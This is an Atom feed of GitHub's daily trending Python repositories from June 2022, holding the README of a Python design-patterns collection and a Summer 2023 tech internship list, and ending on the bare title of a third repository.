<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-06-02T01:32:44Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>faif/python-patterns</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/faif/python-patterns</id>
    <link href="https://github.com/faif/python-patterns" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A collection of design patterns/idioms in Python&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;python-patterns&lt;/h1&gt; &#xA;&lt;p&gt;A collection of design patterns and idioms in Python.&lt;/p&gt; &#xA;&lt;h2&gt;Current Patterns&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Creational Patterns&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Pattern&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/creational/abstract_factory.py&#34;&gt;abstract_factory&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;use a generic function with specific factories&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/creational/borg.py&#34;&gt;borg&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;a singleton with shared-state among instances&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/creational/builder.py&#34;&gt;builder&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;instead of using multiple constructors, builder object receives parameters and returns constructed objects&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/creational/factory.py&#34;&gt;factory&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;delegate a specialized function/method to create instances&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/creational/lazy_evaluation.py&#34;&gt;lazy_evaluation&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;lazily-evaluated property pattern in Python&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/creational/pool.py&#34;&gt;pool&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;preinstantiate and maintain a group of instances of the same type&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/creational/prototype.py&#34;&gt;prototype&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;use a factory and clones of a prototype for new instances (if instantiation is expensive)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;strong&gt;Structural Patterns&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Pattern&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/structural/3-tier.py&#34;&gt;3-tier&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;data&amp;lt;-&amp;gt;business logic&amp;lt;-&amp;gt;presentation separation (strict relationships)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/structural/adapter.py&#34;&gt;adapter&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;adapt one interface to another using a white-list&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/structural/bridge.py&#34;&gt;bridge&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;a client-provider middleman to soften interface changes&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/structural/composite.py&#34;&gt;composite&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;lets clients treat individual objects and compositions uniformly&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/structural/decorator.py&#34;&gt;decorator&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;wrap functionality with other functionality in order to affect outputs&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/structural/facade.py&#34;&gt;facade&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;use one class as an API to a number of others&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/structural/flyweight.py&#34;&gt;flyweight&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;transparently reuse existing instances of objects with similar/identical state&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/structural/front_controller.py&#34;&gt;front_controller&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;single handler requests coming to the application&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/structural/mvc.py&#34;&gt;mvc&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;model&amp;lt;-&amp;gt;view&amp;lt;-&amp;gt;controller (non-strict relationships)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/structural/proxy.py&#34;&gt;proxy&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;an object funnels operations to something else&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;strong&gt;Behavioral Patterns&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Pattern&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/chain_of_responsibility.py&#34;&gt;chain_of_responsibility&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;apply a chain of successive handlers to try and process the data&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/catalog.py&#34;&gt;catalog&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;general methods will call different specialized methods based on construction parameter&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/chaining_method.py&#34;&gt;chaining_method&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;continue callback next object method&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/command.py&#34;&gt;command&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;bundle a command and arguments to call later&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/iterator.py&#34;&gt;iterator&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;traverse a container and access the container&#39;s elements&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/iterator_alt.py&#34;&gt;iterator&lt;/a&gt; (alt. impl.)&lt;/td&gt; &#xA;   &lt;td&gt;traverse a container and access the container&#39;s elements&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/mediator.py&#34;&gt;mediator&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;an object that knows how to connect other objects and act as a proxy&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/memento.py&#34;&gt;memento&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;generate an opaque token that can be used to go back to a previous state&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/observer.py&#34;&gt;observer&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;provide a callback for notification of events/changes to data&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/publish_subscribe.py&#34;&gt;publish_subscribe&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;a source syndicates events/data to 0+ registered listeners&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/registry.py&#34;&gt;registry&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;keep track of all subclasses of a given class&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/specification.py&#34;&gt;specification&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;business rules can be recombined by chaining the business rules together using boolean logic&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/state.py&#34;&gt;state&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;logic is organized into a discrete number of potential states and the next state that can be transitioned to&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/strategy.py&#34;&gt;strategy&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;selectable operations over the same data&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/template.py&#34;&gt;template&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;an object imposes a structure but takes pluggable components&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/visitor.py&#34;&gt;visitor&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;invoke a callback for all items of a collection&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;strong&gt;Design for Testability Patterns&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Pattern&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/dependency_injection.py&#34;&gt;dependency_injection&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;3 variants of dependency injection&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;strong&gt;Fundamental Patterns&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Pattern&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/fundamental/delegation_pattern.py&#34;&gt;delegation_pattern&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;an object handles a request by delegating to a second object (the delegate)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;strong&gt;Others&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Pattern&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/other/blackboard.py&#34;&gt;blackboard&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;architectural model, assemble different sub-system knowledge to build a solution, AI approach - non gang of four pattern&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/other/graph_search.py&#34;&gt;graph_search&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;graphing algorithms - non gang of four pattern&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/other/hsm/hsm.py&#34;&gt;hsm&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;hierarchical state machine - non gang of four pattern&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Videos&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=bsyjSW46TDg&#34;&gt;Design Patterns in Python by Peter Ullrich&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=G5OeYHCJuv0&#34;&gt;Sebastian Buczyński - Why you don&#39;t need design patterns in Python?&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=imW-trt0i9I&#34;&gt;You Don&#39;t Need That!&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=PfgEU3W0kyU&#34;&gt;Pluggable Libs Through Design Patterns&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;When an implementation is added or modified, please review the following guidelines:&lt;/p&gt; &#xA;&lt;h5&gt;Output&lt;/h5&gt; &#xA;&lt;p&gt;All files with example patterns have &lt;code&gt;### OUTPUT ###&lt;/code&gt; section at the bottom (migration to OUTPUT = &#34;&#34;&#34;...&#34;&#34;&#34; is in progress).&lt;/p&gt; &#xA;&lt;p&gt;Run &lt;code&gt;append_output.sh&lt;/code&gt; (e.g. &lt;code&gt;./append_output.sh borg.py&lt;/code&gt;) to generate/update it.&lt;/p&gt; &#xA;&lt;h5&gt;Docstrings&lt;/h5&gt; &#xA;&lt;p&gt;Add module level description in form of a docstring with links to corresponding references or other useful information.&lt;/p&gt; &#xA;&lt;p&gt;Add &#34;Examples in Python ecosystem&#34; section if you know some. It shows how patterns could be applied to real-world problems.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/structural/facade.py&#34;&gt;facade.py&lt;/a&gt; has a good example of detailed description, but sometimes the shorter one as in &lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/behavioral/template.py&#34;&gt;template.py&lt;/a&gt; would suffice.&lt;/p&gt; &#xA;&lt;p&gt;In some cases class-level docstring with doctest would also help (see &lt;a href=&#34;https://raw.githubusercontent.com/faif/python-patterns/master/patterns/structural/adapter.py&#34;&gt;adapter.py&lt;/a&gt;) but readable OUTPUT section is much better.&lt;/p&gt; &#xA;&lt;h5&gt;Python 2 compatibility&lt;/h5&gt; &#xA;&lt;p&gt;To see Python 2 compatible versions of some patterns please check-out the &lt;a href=&#34;https://github.com/faif/python-patterns/tree/legacy&#34;&gt;legacy&lt;/a&gt; tag.&lt;/p&gt; &#xA;&lt;h5&gt;Update README&lt;/h5&gt; &#xA;&lt;p&gt;When everything else is done - update corresponding part of README.&lt;/p&gt; &#xA;&lt;h5&gt;Travis CI&lt;/h5&gt; &#xA;&lt;p&gt;Please run &lt;code&gt;tox&lt;/code&gt; or &lt;code&gt;tox -e ci37&lt;/code&gt; before submitting a patch to be sure your changes will pass CI.&lt;/p&gt; &#xA;&lt;p&gt;You can also run &lt;code&gt;flake8&lt;/code&gt; or &lt;code&gt;pytest&lt;/code&gt; commands manually. Examples can be found in &lt;code&gt;tox.ini&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing via issue triage &lt;a href=&#34;https://www.codetriage.com/faif/python-patterns&#34;&gt;&lt;img src=&#34;https://www.codetriage.com/faif/python-patterns/badges/users.svg?sanitize=true&#34; alt=&#34;Open Source Helpers&#34;&gt;&lt;/a&gt;&lt;/h2&gt; &#xA;&lt;p&gt;You can triage issues and pull requests which may include reproducing bug reports or asking for vital information, such as version numbers or reproduction instructions. If you would like to start triaging issues, one easy way to get started is to &lt;a href=&#34;https://www.codetriage.com/faif/python-patterns&#34;&gt;subscribe to python-patterns on CodeTriage&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>pittcsc/Summer2023-Internships</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/pittcsc/Summer2023-Internships</id>
    <link href="https://github.com/pittcsc/Summer2023-Internships" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Collection of Summer 2023 tech internships!&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Summer 2023 Tech Internships by Pitt CSC 🌆🐢&lt;/h1&gt; &#xA;&lt;p&gt;And we&#39;re back! Use this repo to share and keep track of software, tech, CS, PM, quant internships for Summer 2023. List maintained by &lt;a href=&#34;https://pittcsc.org/&#34;&gt;the Pitt Computer Science Club&lt;/a&gt;!&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;h3&gt; Thanks for a great two years 💖💖 &lt;/h3&gt; &#xA; &lt;p&gt; &lt;img src=&#34;https://api.star-history.com/svg?repos=pittcsc/Summer2022-Internships&amp;amp;type=Date&#34; width=&#34;500&#34; alt=&#34;Star History&#34;&gt; &lt;/p&gt; &#xA; &lt;i&gt;Want to reach millions of CS students? Email &lt;a href=&#34;mailto:pittcsc@gmail.com?subject=Sponsoring the CSC Internship Repo&#34;&gt;pittcsc@gmail.com&lt;/a&gt; for partnership opportunities!&lt;/i&gt; &#xA;&lt;/div&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;p&gt; &lt;a href=&#34;https://simplify.jobs/?utm_source=pittcsc&amp;amp;utm_medium=internships_repo&#34;&gt; &lt;b&gt;Applying to internships?&lt;/b&gt; &lt;br&gt; Autofill all your applications in a single click. &lt;br&gt; &lt;/a&gt;&lt;/p&gt;&#xA; &lt;div&gt;&#xA;  &lt;a href=&#34;https://simplify.jobs/?utm_source=pittcsc&amp;amp;utm_medium=internships_repo&#34;&gt; &lt;img src=&#34;https://res.cloudinary.com/dpeo4xcnc/image/upload/v1636594918/simplify_pittcsc.png&#34; width=&#34;450&#34; alt=&#34;Simplify&#34;&gt; &lt;/a&gt;&#xA; &lt;/div&gt;&#xA; &lt;a href=&#34;https://simplify.jobs/?utm_source=pittcsc&amp;amp;utm_medium=internships_repo&#34;&gt; &lt;/a&gt; &#xA; &lt;sub&gt;&lt;i&gt;Stop manually re-entering your information. Simplify’s extension helps you autofill internship applications on millions of sites.&lt;/i&gt;&lt;/sub&gt; &#xA; &lt;p&gt;&lt;/p&gt; &#xA;&lt;/div&gt; &#xA;&lt;hr&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;span&gt;⚠&lt;/span&gt; &lt;strong&gt;This repository is only for internships/co-ops in the United States, Canada or for Remote positions&lt;span&gt;🌎&lt;/span&gt;.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;🧠 For tips on the internship process check out the &lt;a href=&#34;https://www.pittcs.wiki/zero-to-offer&#34;&gt;Zero to Offer&lt;/a&gt; 🧠&lt;/p&gt; &#xA;&lt;p&gt;🙏 &lt;strong&gt;Contribute by submitting a &lt;a href=&#34;https://github.com/susam/gitpr#create-pull-request&#34;&gt;pull request&lt;/a&gt;!&lt;/strong&gt; 🙏&lt;/p&gt; &#xA;&lt;h2&gt;The List 👔&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Name&lt;/th&gt; &#xA;   &lt;th&gt;Location&lt;/th&gt; &#xA;   &lt;th&gt;Notes&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.optiver.com/working-at-optiver/career-opportunities/5674025002/&#34;&gt;Optiver&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Chicago, IL&lt;/td&gt; &#xA;   &lt;td&gt;Interest&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://boards.greenhouse.io/bridgewater89/jobs/4076389002&#34;&gt;Bridgewater Associates&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Westport, CT&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://fiverings.avature.net/careers/FolderDetail/New-York-New-York-United-States-Quantitative-Trading-Intern-Summer-2023/586&#34;&gt;Five Rings&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;NYC, NY&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://cvent.me/RLRe57?RefId=refWC2021&#34;&gt;Greylock Techfair&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Virtual&lt;/td&gt; &#xA;   &lt;td&gt;Not an internship but a great career fair, Learn more &lt;a href=&#34;https://greylock.com/university-programs/&#34;&gt;here&lt;/a&gt;!&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://careers.aqr.com/jobs/university-open-positions/greenwich-ct/2023-summer-internship-express-interest/2194349?gh_jid=2194349#/&#34;&gt;AQR&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Greenwich, CT&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://tas-creditsuisse.taleo.net/careersection/campus/moresearch.ftl&#34;&gt;Credit Suisse&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Raleigh, NC; NYC, NY&lt;/td&gt; &#xA;   &lt;td&gt;Search for &lt;code&gt;2023 Americas Technology Summer Analyst&lt;/code&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://jobs.citi.com/job/new-york/quantitative-analysis-summer-analyst-north-america-2023/287/28553736048&#34;&gt;Citi&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;New York, New York&lt;/td&gt; &#xA;   &lt;td&gt;Quantitative Analysis&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.amazon.jobs/en/jobs/1999770/amazon-robotics-software-development-engineer-sde-intern-summer-2023&#34;&gt;Amazon Robotics&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Greater Boston, MA&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://careers.sig.com/job/6289/Trading-Intern-Summer-2023-Expression-of-Interest&#34;&gt;SIG&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Philadelphia, PA&lt;/td&gt; &#xA;   &lt;td&gt;Quant Trading Expression of Interest&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;strong&gt;We love our contributors ❤️❤️&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Make a &lt;a href=&#34;https://github.com/susam/gitpr#create-pull-request&#34;&gt;pull request&lt;/a&gt; to help contribute.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/owini&#34;&gt;owini&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/gintass&#34;&gt;GintasS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/EParmar18&#34;&gt;EParmar18&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/itscrystalli&#34;&gt;itscrystalli&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>reddelexc/hackerone-reports</title>
